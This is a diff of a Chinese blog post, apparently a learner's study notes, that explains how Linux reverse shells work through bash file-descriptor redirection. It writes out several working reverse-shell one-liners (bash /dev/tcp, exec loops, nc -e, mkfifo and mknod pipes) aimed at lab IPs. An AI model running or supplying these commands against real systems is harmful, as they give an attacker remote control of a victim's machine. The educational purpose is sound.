@@ -1,12 +1,25 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.1" type="image/png" sizes="32x32"><meta property="og:type" content="article">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.1" type="image/png" sizes="32x32"><meta name="description" content="什么是反弹shell                           shell是什么       shell可以理解为就是一个可以输入命令的窗口，即命令行窗口">
+<meta property="og:type" content="article">
 <meta property="og:title" content="linux反弹shell的本质(二)">
 <meta property="og:url" content="http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="Tlife">
+<meta property="og:description" content="什么是反弹shell                           shell是什么       shell可以理解为就是一个可以输入命令的窗口，即命令行窗口">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204170702.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171106.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171035.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181449.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181443.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204184458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204183721.png">
 <meta property="article:published_time" content="2021-02-03T13:06:52.000Z">
-<meta property="article:modified_time" content="2021-02-03T13:06:52.924Z">
+<meta property="article:modified_time" content="2021-02-04T11:33:56.606Z">
 <meta property="article:author" content="vague huang">
-<meta name="twitter:card" content="summary"><title>linux反弹shell的本质(二) | Tlife</title><link ref="canonical" href="http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.1"><script>var Stun = window.Stun || {};
+<meta property="article:tag" content="反弹shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204170702.png"><title>linux反弹shell的本质(二) | Tlife</title><link ref="canonical" href="http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.1"><script>var Stun = window.Stun || {};
 var CONFIG = {
   root: '/',
   algolia: undefined,
@@ -30,4 +43,153 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Tlife</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">linux反弹shell的本质(二)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-03</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">vague huang</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/">http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/"><span class="paginator-prev__text">linux反弹shell的本质(一)</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/20210123130445.png" alt="avatar"></div><p class="sidebar-ov-author__text">tlife</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">38</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>vague huang</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.2.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">Visitors</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.1"></script><script src="/js/stun-boot.js?v=2.6.1"></script><script src="/js/scroll.js?v=2.6.1"></script><script src="/js/header.js?v=2.6.1"></script><script src="/js/sidebar.js?v=2.6.1"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Tlife</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">linux反弹shell的本质(二)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-04</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h2 id="什么是反弹shell">
+          <a href="#什么是反弹shell" class="heading-link"><i class="fas fa-link"></i></a>什么是反弹shell</h2>
+      
+        <h4 id="shell是什么">
+          <a href="#shell是什么" class="heading-link"><i class="fas fa-link"></i></a>shell是什么</h4>
+      <p>shell可以理解为就是一个可以输入命令的窗口，即命令行窗口               <a id="more"></a></p>
+
+        <h4 id="反弹shell">
+          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a>反弹shell</h4>
+      <p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转.</p>
+
+        <h2 id="反弹shell的本质">
+          <a href="#反弹shell的本质" class="heading-link"><i class="fas fa-link"></i></a>反弹shell的本质:</h2>
+      <p><strong>文字描述:</strong><br>攻击端为attacker，被攻击端为victim<br>attacker和victim在某一端口实现互联，我们之前说过linux中一切皆文件，所以可以理解是，attacker的输入重定向至victim的输入，victim的输出重定向至attacker构成了这样一个回路<br>接下来我们来分解这一过程:</p>
+
+        <h3 id="准备">
+          <a href="#准备" class="heading-link"><i class="fas fa-link"></i></a>准备</h3>
+      <p>attacker ip：192.168.11.128<br>victim ip: </p>
+<p>首先在attacker上监听：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></div></figure>
+
+<p>在victim上执行:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204170702.png" alt="img" style="zoom:67%;">
+接下来就可以看到在我们的attacker上实现了弹出了victim的shell。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171106.png" alt="img" style="zoom:67%;">
+并且可以在此执行命令，获得victim上的内容
+
+
+        <h4 id="剖析命令">
+          <a href="#剖析命令" class="heading-link"><i class="fas fa-link"></i></a>剖析命令</h4>
+      <p><strong>1.bash -i</strong></p>
+<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+<p>2）-i 这个参数表示的是产生交互式的shell</p>
+<p><strong>2./dev/tcp/ip/port</strong></p>
+<p><strong>/dev/tcp|udp/ip/port</strong> 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf021f9e-9c80-1.png"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171035.png" alt="img"></a></p>
+<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
+
+        <h4 id="交互重定向——分解交互过程">
+          <a href="#交互重定向——分解交互过程" class="heading-link"><i class="fas fa-link"></i></a>交互重定向——分解交互过程</h4>
+      
+        <h5 id="1实现victim上的输入输出至attacker中（victim输出重定向）">
+          <a href="#1实现victim上的输入输出至attacker中（victim输出重定向）" class="heading-link"><i class="fas fa-link"></i></a>1实现victim上的输入输出至attacker中（victim输出重定向）</h5>
+      <p>在attacker上输入:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></div></figure>
+
+<p>在victim上输入:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base -i &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</span><br></pre></td></tr></table></div></figure>
+
+<p>此时 在victim上的输入，会输出至attacker 但是 attacker却无法对victim进行干扰<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175222.png" alt="img" style="zoom:67%;"></p>
+<h5 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175235.png" alt="img" style="zoom: 50%;"></h5>
+        <h5 id="2-实现attacker上的输入至victim（victim输入重定向）">
+          <a href="#2-实现attacker上的输入至victim（victim输入重定向）" class="heading-link"><i class="fas fa-link"></i></a>2.实现attacker上的输入至victim（victim输入重定向）</h5>
+      <p>在victim上输入:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333</span><br></pre></td></tr></table></div></figure>
+
+<p>在attacker上输入的内容就会被重定向至victim中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181449.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181443.png" alt="img" style="zoom:67%;"></p>
+
+        <h5 id="3-结合以上两条指令">
+          <a href="#3-结合以上两条指令" class="heading-link"><i class="fas fa-link"></i></a>3.结合以上两条指令</h5>
+      <p>在victim上输入:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<p>我们从左到右分析，此时victim的输出重定向至attacker，接下来是0&gt;&amp;1,即将attacker的输入重定向输出到victim的输入，而之前我们说了，victim的输入会重定向输出至attacker，可能有点绕，把这个想象成一个回路</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204184458.png" alt="img" style="zoom:67%;">
+但是，我们在victim上仍然可以看到我们在attacker输入的命令，为什么呢？因为attacker的输入重定向输出到了victim，接下来victim才会根据这个输入执行输出结果
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204183721.png" alt="img" style="zoom:67%;">
+
+<p>该如何解决呢？<br>使用 :<strong>&gt;&amp;word= &gt; word 2&gt;&amp;1</strong></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333 0&gt;&amp;1 </span><br></pre></td></tr></table></div></figure>
+
+<p>解析：从victim的标准输出以及标准错误输出都重定向到了attacker，而attacker的输入又重定向输入至victim，此时victim接收到了我们从attacker上的标准输入，执行命令标准输出至attacker，但由于标准错误输出也重定向到了attacker，所以在victim上就看不到我们的命令了。有点绕，还是想象成一个环，只不过刚才的数据环运作过程中，有一个信息停滞没走。</p>
+
+        <h2 id="常见的反弹shell语句">
+          <a href="#常见的反弹shell语句" class="heading-link"><i class="fas fa-link"></i></a>常见的反弹shell语句</h2>
+      
+        <h3 id="1-方法一">
+          <a href="#1-方法一" class="heading-link"><i class="fas fa-link"></i></a>1.方法一</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<p>和</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了）</p>
+
+        <h3 id="2-方法二">
+          <a href="#2-方法二" class="heading-link"><i class="fas fa-link"></i></a>2.方法二</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</span><br></pre></td></tr></table></div></figure>
+
+<p>等价于</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;2</span><br></pre></td></tr></table></div></figure>
+
+<p>这里再谈谈理解，首先victim的标准输出以及标准错误输出至attacker输出，而attacker的标准输入至victim的标准错误输出上，而victim的标准错误输出边如前面所说的有attacker输出。</p>
+
+        <h3 id="3-方法三">
+          <a href="#3-方法三" class="heading-link"><i class="fas fa-link"></i></a>3.方法三</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>简单的解释一下：</strong></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333</span><br></pre></td></tr></table></div></figure>
+
+<p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></div></figure>
+
+<p>这个是一个非常经典的句子，它的原句是这样的</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></div></figure>
+
+<p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p>
+<p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
+<p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;attackerip&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="4-方法四">
+          <a href="#4-方法四" class="heading-link"><i class="fas fa-link"></i></a>4.方法四</h3>
+      <p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh 192.168.146.129 2333</span><br></pre></td></tr></table></div></figure>
+
+<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>简单的解释：</strong></p>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>类似的命令：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="小结">
+          <a href="#小结" class="heading-link"><i class="fas fa-link"></i></a>小结</h2>
+      <p>通过这两天的学习，感觉对于linux反弹shell终于有了一些更深的理解，感觉对于之前的cat /&gt;flag等的理解都变深了一些，尤其是之间的交互作用的原理de理解</p>
+<p>参考:<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549#toc-4">https://xz.aliyun.com/t/2549#toc-4</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">vague huang</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/">http://example.com/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/"><span class="paginator-prev__text">linux反弹shell的本质(一)</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">
+          什么是反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.0.1.</span> <span class="toc-text">
+          shell是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.0.2.</span> <span class="toc-text">
+          反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-number">2.</span> <span class="toc-text">
+          反弹shell的本质:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.1.</span> <span class="toc-text">
+          准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%96%E6%9E%90%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">
+          剖析命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E9%87%8D%E5%AE%9A%E5%90%91%E2%80%94%E2%80%94%E5%88%86%E8%A7%A3%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">
+          交互重定向——分解交互过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E5%AE%9E%E7%8E%B0victim%E4%B8%8A%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E8%87%B3attacker%E4%B8%AD%EF%BC%88victim%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%89"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">
+          1实现victim上的输入输出至attacker中（victim输出重定向）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">2.1.2.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AE%9E%E7%8E%B0attacker%E4%B8%8A%E7%9A%84%E8%BE%93%E5%85%A5%E8%87%B3victim%EF%BC%88victim%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%89"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">
